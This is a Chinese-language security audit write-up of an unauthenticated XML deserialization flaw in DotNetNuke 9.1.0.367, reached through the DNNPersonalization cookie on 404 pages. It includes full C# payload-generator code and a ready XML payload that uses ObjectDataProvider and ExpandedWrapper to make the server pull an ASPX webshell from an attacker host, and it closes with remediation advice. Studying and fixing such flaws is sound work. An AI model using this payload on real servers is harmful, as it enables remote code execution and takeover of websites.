这篇文章记录一次 DotNetNuke / DNN 9.1.0.367 的白盒审计过程。核心问题出现在 `DNNPersonalization` Cookie 的 XML 反序列化流程中：未认证请求可以通过 404 页面路径进入 `LoadProfile()`，并让服务端用攻击者可控的 `type` 属性创建 `XmlSerializer`，最终借助 `ObjectDataProvider` 与 `ExpandedWrapper` 调用 `FileSystemUtils.PullFile()` 写入 WebShell。


# 漏洞概述

- 产品：DotNetNuke / DNN 9.1.0.367
- 漏洞类型：.NET `XmlSerializer` 反序列化 RCE
- 入口 URL：任意不存在页面 / 404 页面
- 可控参数：`Cookie: DNNPersonalization`
- 认证要求：无需认证
- 触发位置：`PersonalizationController.LoadProfile()`
- 最终影响：通过反序列化 `ObjectDataProvider` 调用 `FileSystemUtils.PullFile()`，写入 WebShell 并获得 RCE


# 审计入口

使用 `dnSpy` 对目标程序集进行反编译和调试。第一步是定位能够接收外部输入的入口点。

## 定位 Cookie 入口

搜索关键字 `DNNPersonalization`，可以定位到 `DotNetNuke.Services.Personalization` 相关逻辑。继续跟进后，在 `DotNetNuke.Services.Personalization.PersonalizationController` 命名空间中找到目标函数 `LoadProfile()`。

![[Pasted image 20260524114105.png]]

![[Pasted image 20260524114116.png]]

核心代码如下：

```csharp
HttpContext httpContext = HttpContext.Current;

if (httpContext != null && httpContext.Request.Cookies["DNNPersonalization"] != null)
{
    text = httpContext.Request.Cookies["DNNPersonalization"].Value;
}

personalizationInfo.Profile =
    string.IsNullOrEmpty(text) ? new Hashtable() : Globals.DeserializeHashTableXml(text);
```

这里可以确认，攻击者能够通过控制 `DNNPersonalization` Cookie 的值影响变量 `text`，随后该值会被传入 `DeserializeHashTableXml()`。

## 反序列化调用链

```text
HTTP Request
  ↓
Cookie: DNNPersonalization
  ↓
LoadProfile()
  ↓
Globals.DeserializeHashTableXml()
  ↓
XmlUtils.DeSerializeHashtable()
  ↓
XmlDocument.LoadXml(xmlSource)
  ↓
SelectNodes("profile/item")
  ↓
读取 item 的 type 属性
  ↓
Type.GetType(type)
  ↓
new XmlSerializer(type)
  ↓
Deserialize(xmlReader)
```


# 漏洞成因

## 危险函数

核心函数是 `DeSerializeHashtable()`：

```csharp
public static Hashtable DeSerializeHashtable(string xmlSource, string rootname)
{
    Hashtable hashtable = new Hashtable();

    if (!string.IsNullOrEmpty(xmlSource))
    {
        try
        {
            XmlDocument xmlDocument = new XmlDocument();
            xmlDocument.LoadXml(xmlSource);

            foreach (object obj in xmlDocument.SelectNodes(rootname + "/item"))
            {
                XmlElement xmlElement = (XmlElement)obj;

                string attribute = xmlElement.GetAttribute("key");
                string attribute2 = xmlElement.GetAttribute("type");

                XmlSerializer xmlSerializer =
                    new XmlSerializer(Type.GetType(attribute2));

                XmlTextReader xmlReader =
                    new XmlTextReader(new StringReader(xmlElement.InnerXml));

                hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));
            }
        }
        catch (Exception)
        {
        }
    }

    return hashtable;
}
```

关键点在下面两行：

```csharp
XmlSerializer xmlSerializer = new XmlSerializer(Type.GetType(attribute2));
hashtable.Add(attribute, xmlSerializer.Deserialize(xmlReader));
```

攻击者可以控制 XML 内容，也可以控制 `item` 节点的 `type` 属性。程序随后使用 `Type.GetType()` 动态解析攻击者指定的类型，并且没有进行类型白名单校验，最终把可控类型交给 `XmlSerializer.Deserialize()` 处理。

## 为什么能触发代码执行

`XmlSerializer` 本身并不会直接执行系统命令。它的风险在于反序列化时会实例化对象并设置 public 属性。某些类型的属性 setter 会触发额外逻辑，如果这个逻辑可以间接调用方法，就可能形成 RCE 链。


# 利用条件

完整利用需要满足以下条件：

1. 目标 DNN 版本存在该反序列化逻辑。
2. 未认证请求可以触发 `LoadProfile()`。
3. `DNNPersonalization` Cookie 可控。
4. 目标环境中存在可被 `XmlSerializer` 处理的 gadget 类型。
5. 目标 Web 目录或相关路径可写。
6. 目标服务器可以访问攻击者控制的 HTTP 服务。


# 利用路线

## 第一阶段：确认 Cookie 可进入反序列化流程

访问目标主页后，目标服务器上会出现新的 IIS Worker Process：`w3wp.exe`。

![[Pasted image 20260524220109.png]]

使用 `dnSpy` 附加到对应进程，并在 Cookie 判断语句处设置断点。

![[Pasted image 20260524220518.png]]

通过 Burp 构造一个未经身份验证的请求，访问一个不存在的页面，并携带测试用的 `DNNPersonalization` Cookie。

![[Pasted image 20260524220540.png]]

为什么访问不存在的页面？因为这是 DNN 中最容易到达 `LoadProfile()` 的未认证路径。大致流程是：发送请求，触发 404，进入 `AdvancedUrlReWriter.Handle404OrException()`，随后访问 `PortalSettings.UserMode`，再进入 `Personalization.GetProfile()`，最后到达 `LoadProfile()`。

如果流程正确，请求发送后会触发 `dnSpy` 中的断点。

![[Pasted image 20260524220550.png]]

这说明访问不存在页面时，请求确实会进入 DNN 的 personalization 加载流程。

## 第二阶段：寻找可利用类型

在 DotNetNuke 中，比较实用的目标方法是 `DotNetNuke.Common.Utilities.FileSystemUtils.PullFile()`。该方法可以从远程 URL 下载文件，并保存到本地路径。

理想攻击流程如下：

```text
从攻击者服务器下载 ASPX WebShell
  ↓
写入 DNN Web 根目录
  ↓
访问 WebShell
  ↓
获得 RCE
```

问题在于，`XmlSerializer` 只能处理 public 属性和字段，不能直接调用方法。因此不能简单地反序列化 `FileSystemUtils` 并直接调用 `PullFile()`。

## 第三阶段：使用 ObjectDataProvider 作为调用桥梁

可以使用 `System.Windows.Data.ObjectDataProvider` 作为调用桥梁。它能够通过属性配置自动调用某个对象的方法：

- `MethodName` 指定要调用的方法。
- `MethodParameters` 指定传入的参数。

核心属性关系如下：

```text
ObjectInstance      → 被包装对象
MethodName          → 要调用的方法名
MethodParameters    → 方法参数
```

示例结构：

```text
ObjectInstance = new FileSystemUtils()
MethodName = "PullFile"
MethodParameters[0] = "http://attacker/cmdasp.aspx"
MethodParameters[1] = "C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx"
```

## 第四阶段：解决 ObjectDataProvider 直接序列化失败问题

这里还存在一个类型识别问题。`XmlSerializer` 实例是根据传入对象的 `GetType()` 结果创建的。如果直接传入 `ObjectDataProvider`，序列化器看到的类型就是 `ObjectDataProvider`，它无法识别 `ObjectDataProvider` 内部封装的 `FileSystemUtils` 类型。

解决方法是使用 `System.Data.Services.Internal.ExpandedWrapper<T0, T1>`。它可以把 `FileSystemUtils` 与 `ObjectDataProvider` 的类型关系显式写入外层泛型类型，使 `XmlSerializer` 能够识别完整类型结构。

最终结构如下：

```text
ExpandedWrapper<FileSystemUtils, ObjectDataProvider>
```


# Payload 构造

## Payload 生成代码

```csharp
using System;
using System.IO;
using DotNetNuke.Common.Utilities;
using DotNetNuke.Common;
using System.Collections;
using System.Data.Services.Internal;
using System.Windows.Data;

namespace ExpWrapSerializer
{
    class Program
    {
        static void Main(string[] args)
        {
            Serialize();
        }

        public static void Serialize()
        {
            ExpandedWrapper<FileSystemUtils, ObjectDataProvider> myExpWrap =
                new ExpandedWrapper<FileSystemUtils, ObjectDataProvider>();

            myExpWrap.ProjectedProperty0 = new ObjectDataProvider();

            myExpWrap.ProjectedProperty0.ObjectInstance =
                new FileSystemUtils();

            myExpWrap.ProjectedProperty0.MethodName =
                "PullFile";

            myExpWrap.ProjectedProperty0.MethodParameters.Add(
                "http://ATTACKER-IP/cmdasp.aspx"
            );

            myExpWrap.ProjectedProperty0.MethodParameters.Add(
                "C:/inetpub/wwwroot/dotnetnuke/cmdasp.aspx"
            );

            Hashtable table = new Hashtable();
            table["myTableEntry"] = myExpWrap;

            string payload = XmlUtils.SerializeDictionary(table, "profile");

            TextWriter writer =
                new StreamWriter("C:\\Users\\Public\\ExpWrap.txt");

            writer.Write(payload);
            writer.Close();

            Console.WriteLine("Done!");
        }
    }
}
```

## 生成后的 XML 结构

大致结构如下：

```xml
<profile><item key="myTableEntry" type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils, DotNetNuke, Version=9.1.0.367, Culture=neutral, PublicKeyToken=null],[System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]], System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><ProjectedProperty0><ObjectInstance xsi:type="FileSystemUtils" /><MethodName>PullFile</MethodName><MethodParameters><anyType xsi:type="xsd:string">http://192.168.119.120/myODPTest.txt</anyType><anyType xsi:type="xsd:string">C:/inetpub/wwwroot/dotnetnuke/PullFileTest.txt</anyType></MethodParameters></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>
```

序列化后的对象结构中，`profile` 节点下包含一个 `item` 节点。该节点的 `type` 属性不再只是普通的 `ObjectDataProvider`，而是包含 `ExpandedWrapper`、`FileSystemUtils` 和 `ObjectDataProvider` 的完整类型信息。这样序列化器才能识别被包装对象的实际类型。


# 最终利用链

```text
攻击者准备 ASPX WebShell
  ↓
攻击者开启 HTTP 服务
  ↓
生成 DNNPersonalization XML Payload
  ↓
将 Payload 放入 Cookie
  ↓
访问目标不存在页面
  ↓
触发 DNN 404 处理逻辑
  ↓
进入 LoadProfile()
  ↓
读取 DNNPersonalization Cookie
  ↓
DeserializeHashTableXml()
  ↓
DeSerializeHashtable()
  ↓
Type.GetType(type)
  ↓
XmlSerializer.Deserialize()
  ↓
反序列化 ExpandedWrapper
  ↓
设置 ObjectDataProvider 属性
  ↓
ObjectDataProvider 调用 PullFile()
  ↓
目标从攻击者服务器下载 cmdasp.aspx
  ↓
写入 DNN Web 根目录
  ↓
访问 cmdasp.aspx
  ↓
RCE / Reverse Shell
```


# 修复建议

## 禁止用户控制反序列化类型

不要使用用户输入直接构造类型：

```csharp
new XmlSerializer(Type.GetType(userInput))
```

尤其要避免把 Cookie、请求参数或其他外部输入直接传给 `Type.GetType()`。

## 使用类型白名单

只允许固定、预期内的类型参与反序列化：

```csharp
allowedTypes = {
    typeof(string),
    typeof(int),
    typeof(UserPreference)
}
```

禁止反序列化任意程序集类型。

## 不在 Cookie 中保存复杂对象

Cookie 中只应保存简单状态：

```text
Session ID
简单偏好 ID
语言配置
短 token
```

不应保存以下内容：

```text
可反序列化对象
完整 XML 对象
带 type 信息的对象结构
```

## 降低应用池权限

即使反序列化被触发，也要限制影响范围：

```text
IIS AppPool 不应有 Web 根目录任意写权限
禁止写入可执行脚本目录
限制 outbound HTTP 请求
限制 PowerShell / cmd 执行权限
```

## 升级版本并复查

升级到官方修复版本后，仍应检查是否存在以下模式：

```text
DNNPersonalization Cookie 反序列化
Type.GetType()
XmlSerializer.Deserialize()
ObjectDataProvider gadget
ExpandedWrapper gadget
```
